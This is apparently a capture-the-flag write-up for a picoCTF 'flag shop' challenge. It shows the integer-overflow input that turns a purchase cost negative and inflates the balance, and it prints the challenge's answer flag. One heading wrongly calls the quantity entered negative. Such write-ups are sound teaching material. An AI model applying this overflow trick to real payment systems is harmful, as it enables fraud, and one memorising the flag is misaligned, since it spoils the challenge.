## Descripción:
There's a flag shop selling stuff, can you buy a flag? [Source](https://jupiter.challenges.picoctf.org/static/64e724ad327f83ad833d9c6baa072b1f/store.c). Connect with `nc jupiter.challenges.picoctf.org 4906`.

# Solución
Una tienda de banderas donde no tienes suficiente saldo inicial para comprar la flag real.
Conectarse al servidor
   ```bash
   nc jupiter.challenges.picoctf.org 4906
   ```
Ver saldo inicial
```bash
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
1

 Balance: 1100 
```
 Comprar flags falsas en cantidad negativa
```bash
 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2400000

The final cost is: -2134967296

Your current balance after transaction: 2134968396

```
- Resultado: El costo se vuelve negativo y tu saldo aumenta a millones.

Comprar la flag real
```bash
 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_9c5fac9b}
Welcome to the flag exchange
We sell flags
```

Respuesta: `picoCTF{m0n3y_bag5_9c5fac9b}`

## Notas

## Referencias
 